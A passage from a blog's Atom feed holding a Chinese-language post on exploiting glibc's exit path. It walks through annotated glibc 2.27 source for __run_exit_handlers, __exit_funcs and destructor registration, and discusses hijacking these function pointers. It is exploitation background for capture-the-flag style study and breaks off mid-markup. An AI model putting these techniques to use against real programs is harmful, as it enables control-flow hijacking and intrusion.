<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ixout&#39;s blog</title>
  
  
  <link href="https://ixout.github.io/atom.xml" rel="self"/>
  
  <link href="https://ixout.github.io/"/>
  <updated>2023-04-06T14:38:27.253Z</updated>
  <id>https://ixout.github.io/</id>
  
  <author>
    <name>ixout</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>exit函数利用</title>
    <link href="https://ixout.github.io/posts/11890/"/>
    <id>https://ixout.github.io/posts/11890/</id>
    <published>2023-04-05T03:00:01.000Z</published>
    <updated>2023-04-06T14:38:27.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码2-27"><a href="#源码2-27" class="headerlink" title="源码2.27"></a>源码2.27</h1><p>先看两个exit.h中的重要结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="comment">/*函数类型, 可以是&#123;ef_free, ef_us, ef_on, ef_at, ef_cxa&#125;</span></span><br><span class="line"><span class="comment">       - ef_free表示此位置空闲</span></span><br><span class="line"><span class="comment">       - ef_us表示此位置被使用中, 但是函数类型不知道</span></span><br><span class="line"><span class="comment">       - ef_on, ef_at, ef_cxa 分别对应三种不同的析构函数类型, 主要是参数上的差异*/</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>         //一个联合体<span class="title">func</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">void</span> (*at) (<span class="type">void</span>);   <span class="comment">//ef_at类型 没有参数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);   <span class="comment">//ef_on类型</span></span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">  &#125; on;</span><br><span class="line"><span class="class"><span class="keyword">struct</span>    </span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status); <span class="comment">//ef_cxa类型</span></span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">void</span> *dso_handle;</span><br><span class="line">  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span>  <span class="comment">//下一个exit_function_list,单链表</span></span><br><span class="line">    <span class="type">size_t</span> idx;   <span class="comment">//记录有多少个函数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span>  <span class="comment">//exit_function数组,析构函数数组</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><p>首先是exit的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>libc经典的套娃函数,可以看出exit的主体是__run_exit_handlers</p><p>run_exit_handlers()的主要工作就是<strong>调用exit_funcs中保存的各种函数指针</strong></p><p>看其工作流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用atexit与on_exit注册的函数，顺序为注册的逆序</span></span><br><span class="line"><span class="type">void</span> attribute_hidden __run_exit_handlers(<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//首先释放线程局部储存, 即TLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__call_tls_dtors();</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历exit_fundtion_list链表，链表种每个节点里又有一个函数指针数组，根据里面的函数类型进行调用</span></span><br><span class="line"><span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp; <span class="comment">//cur指向当前exit_function_list节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//cur-&gt;idx表示cur-&gt;fns中有多少个函数，从后往前遍历</span></span><br><span class="line"><span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>) <span class="comment">//遍历exit_function_list节点中 析构函数数组fns[32]中的函数指针</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx]; <span class="comment">//f指向对应析构函数的描述符</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor) <span class="comment">//选择析构函数类型</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//三种函数指针</span></span><br><span class="line">    <span class="type">void</span> (*atfct)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">void</span> (*onfct)(<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">    <span class="type">void</span> (*cxafct)(<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两种类型不调用</span></span><br><span class="line">  <span class="keyword">case</span> ef_free:</span><br><span class="line">  <span class="keyword">case</span> ef_us:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//on类型的参数为注册时设定的参数</span></span><br><span class="line">  <span class="keyword">case</span> ef_on:</span><br><span class="line">    onfct = f-&gt;func.on.fn; <span class="comment">//设置函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    onfct(status, f-&gt;func.on.arg); <span class="comment">//调用这个函数指针</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//at没有参数</span></span><br><span class="line">  <span class="keyword">case</span> ef_at:</span><br><span class="line">    atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    atfct();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//cxa类型则先为设定时的参数，再为状态码</span></span><br><span class="line">  <span class="keyword">case</span> ef_cxa:</span><br><span class="line">    cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE(cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    cxafct(f-&gt;func.cxa.arg, status); </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*listp = cur-&gt;next; <span class="comment">//listp指向下一个exit_function_list节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//最后一个链表节点为libc .data段中的initial，不需要释放</span></span><br><span class="line"><span class="comment">//除此以外的节点都是malloc申请得到的, 所以需要释放</span></span><br><span class="line"><span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">  <span class="built_in">free</span>(cur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (run_list_atexit) <span class="comment">//调用_atexit</span></span><br><span class="line">RUN_HOOK(__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">_exit(status); <span class="comment">//真正的exit系统调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考1-能否劫持-exit-funcs数组"><a href="#思考1-能否劫持-exit-funcs数组" class="headerlink" title="思考1:能否劫持__exit_funcs数组?"></a>思考1:能否劫持__exit_funcs数组?</h2><p>在exit调用<strong>run_exit_handlers()时下断点, 找到</strong>exit_funcs指针</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-04-05_165633.png" alt=""></p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-04-05_170143.png" alt=""></p><p>可以看到其中最重要的fns[0]被加密成乱码了,要想利用的话还要获得存储在fs:0x30的密钥,难度高,几乎难以利用</p><h2 id="exit-funcs如何添加析构函数"><a href="#exit-funcs如何添加析构函数" class="headerlink" title="__exit_funcs如何添加析构函数()"></a>__exit_funcs如何添加析构函数()</h2><p>既然难以攻击<strong>exit_funcs, 那么尝试从</strong>exit_funcs中的函数入手</p><p>我们首先要弄明白, __exit_funcs中的函数是怎么添加的</p><p>libc提供了一个接口: atexit()用来注册exit()时调用的析构函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DSO由GCC定义，用来识别模块的*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> *__dso_handle __attribute__((__weak__));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注册一个exit时调用的析构函数*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">atexit</span><span class="params">(<span class="type">void</span> (*func)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))func, <span class="literal">NULL</span>, &amp;__dso_handle == <span class="literal">NULL</span> ? <span class="literal">NULL</span> : __dso_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cxa_atexit()是对internal_atexit()的封装</p><p>注意: __exit_funcs就是exit()时用的那个指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册一个exit/共享库被卸载时调用的函数，只会被C++编译器生产的代码调用，C会通过atexit调用</span></span><br><span class="line"><span class="type">int</span> __cxa_atexit(<span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __internal_atexit(func, arg, d, &amp;__exit_funcs);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(__cxa_atexit)</span><br></pre></td></tr></table></figure><p><strong>internel_atexit()通过</strong>new_exitfn()找到一个在__exit_funcs链表上注册析构函数的位置, 然后进行写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  参数:</span></span><br><span class="line"><span class="comment">    - func  析构函数指针</span></span><br><span class="line"><span class="comment">    - arg   参数指针</span></span><br><span class="line"><span class="comment">    - d     DSO</span></span><br><span class="line"><span class="comment">    - listp 析构函数数组链表指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> attribute_hidden __internal_atexit(<span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d, <span class="keyword">struct</span> exit_function_list **listp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">new</span> =</span> __new_exitfn(listp); <span class="comment">//先在__exit_funcs链表上添加一个描述析构函数的结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_MANGLE</span></span><br><span class="line">  PTR_MANGLE(func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//然后设置分配到的这个结构体</span></span><br><span class="line">  new-&gt;func.cxa.fn = (<span class="type">void</span> (*)(<span class="type">void</span> *, <span class="type">int</span>))func; <span class="comment">//函数指针</span></span><br><span class="line">  new-&gt;func.cxa.arg = arg;                        <span class="comment">//参数</span></span><br><span class="line">  new-&gt;func.cxa.dso_handle = d;</span><br><span class="line">  atomic_write_barrier();</span><br><span class="line">  new-&gt;flavor = ef_cxa;                         <span class="comment">//类型</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__new_exitfn()的逻辑大致为</p><ul><li>先尝试在__exit_funcs中找到一个exit_function类型的ef_free的位置, ef_free代表着此位置空闲</li><li>如果没找到, 就新建一个exit_function节点, 使用头插法插入__exit_funcs链表, 使用新节点的第一个位置作为分配到的exit_function结构体</li><li>设置找到的exit_function的类型为ef_us, 表示正在使用中, 并返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从listp上返回一个新的exit_function结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *__<span class="title">new_exitfn</span>(<span class="keyword">struct</span> <span class="title">exit_function_list</span> **<span class="title">listp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">l</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">r</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock(lock); <span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//寻找一个析构函数类型为ef_free的位置</span></span><br><span class="line">  <span class="keyword">for</span> (l = *listp; l != <span class="literal">NULL</span>; p = l, l = l-&gt;next) <span class="comment">//遍历链表，l指向当前节点, p指向l的前一个节点</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = l-&gt;idx; i &gt; <span class="number">0</span>; --i)           <span class="comment">//搜索l中的函数指针数组fns[32]</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;fns[i - <span class="number">1</span>].flavor != ef_free) <span class="comment">//有一个不是ef_free的就停止</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) <span class="comment">//在l中找到了, 停止链表遍历</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 只有全部都是ef_free才能走到这里 */</span></span><br><span class="line">    l-&gt;idx = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l == <span class="literal">NULL</span> || i == <span class="keyword">sizeof</span>(l-&gt;fns) / <span class="keyword">sizeof</span>(l-&gt;fns[<span class="number">0</span>])) <span class="comment">//没有找到空闲位置</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    l==null 说明整个__exit_funcs中都没有ef_free</span></span><br><span class="line"><span class="comment">    i == sizeof(l-&gt;fns) / sizeof(l-&gt;fns[0]) 说明对于l节点, fns已经全部遍历了, 都没找到ef_free</span></span><br><span class="line"><span class="comment">    此时就需要插入一个新的exit_function_list节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      assert(l != <span class="literal">NULL</span>);</span><br><span class="line">      p = (<span class="keyword">struct</span> exit_function_list *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> exit_function_list)); <span class="comment">//申请一个结构体, p指向新节点</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  <span class="comment">//分配失败</span></span><br><span class="line">      &#123;</span><br><span class="line">        p-&gt;next = *listp; <span class="comment">//头插法, 再__exit_funcs中插入一个节点</span></span><br><span class="line">        *listp = p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  <span class="comment">//分配成功</span></span><br><span class="line">    &#123;</span><br><span class="line">      r = &amp;p-&gt;fns[<span class="number">0</span>]; <span class="comment">//r指向新节点的第一个析构函数描述结构体</span></span><br><span class="line">      p-&gt;idx = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//找到空闲位置了, l节点中第i个为ef_free</span></span><br><span class="line">  &#123;</span><br><span class="line">    r = &amp;l-&gt;fns[i];</span><br><span class="line">    l-&gt;idx = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 此时这个函数位置的类型从空闲(ef_free)变为使用中(ef_us), 等待写入函数指针 */</span></span><br><span class="line">  <span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    r-&gt;flavor = ef_us;</span><br><span class="line">    ++__new_exitfn_called;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock(lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="析构函数的注册—-libc-start-main"><a href="#析构函数的注册—-libc-start-main" class="headerlink" title="析构函数的注册—__libc_start_main()"></a>析构函数的注册—__libc_start_main()</h2><p><strong>__libc_start_main()</strong>函数初窥</p><ul><li>首先是其参数列表也就是_start()传递的参数, 我们中重点注意下面三个<ul><li>init: ELF文件 也就是main()的构造函数</li><li>fini: ELF文件 也就是main()的析构函数</li><li>rtld_fini: 动态链接器的析构函数</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(</span><br><span class="line">                <span class="type">int</span> (*main)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **MAIN_AUXVEC_DECL), <span class="comment">//参数: main函数指针</span></span><br><span class="line">                <span class="type">int</span> argc, <span class="type">char</span> **argv,                              <span class="comment">//参数: argc argv</span></span><br><span class="line">                ElfW(<span class="type">auxv_t</span>) * auxvec,</span><br><span class="line">                __typeof(main) init,     <span class="comment">//参数: init ELF的构造函数</span></span><br><span class="line">                <span class="type">void</span> (*fini)(<span class="type">void</span>),      <span class="comment">//参数: fini ELF的析构函数</span></span><br><span class="line">                <span class="type">void</span> (*rtld_fini)(<span class="type">void</span>), <span class="comment">//参数: rtld_fini ld的析构函数</span></span><br><span class="line">                <span class="type">void</span> *stack_end         <span class="comment">//参数: 栈顶</span></span><br><span class="line">        )</span><br><span class="line">&#123;</span><br><span class="line">    ...函数体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入函数体, __libc_start_mian()主要做了以下几件事</p><ul><li>为libc保存一些关于main的参数, 比如__environ…</li><li>通过atexit()注册fini 与 rtld_fini 这两个参数</li><li>调用init为main()进行构造操作</li><li>然后调用main()函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(...)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 保存main的返回地址 */</span></span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取环境变量指针, 并保存到libc的.data中</span></span><br><span class="line">  <span class="type">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 保存下栈顶 */</span></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化TLS */</span></span><br><span class="line">  __pthread_initialize_minimal();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置stack guard */</span></span><br><span class="line">  <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard(_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置pointer gurad */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard(_dl_random, stack_chk_guard);</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册动态链接器(ld.so.2)的析构函数  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely(rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 进行一些简单的libc初始化工作: 在libc中保存argc argv env三个参数 */</span></span><br><span class="line">  __libc_init_first(argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册ELF的fini函数  */</span></span><br><span class="line">  <span class="keyword">if</span> (fini)</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果ELF有构造函数的话, 那么先调用init() */</span></span><br><span class="line">  <span class="keyword">if</span> (init)</span><br><span class="line">    (*init)(argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 调用main()  */</span></span><br><span class="line">  result = main(argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果main()返回后, __libc_start_main()回帮他调用exit()函数 */</span></span><br><span class="line">  <span class="built_in">exit</span>(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们知道libc_start_mian()会在exit_funcs中放入下面两个函数</p><p><strong>ELF的fini函数</strong>和<strong>ld的rtld_fini函数</strong></p><p>然后会调用一个构造函数:</p><p><strong>init()</strong></p><h3 id="ELF的fini"><a href="#ELF的fini" class="headerlink" 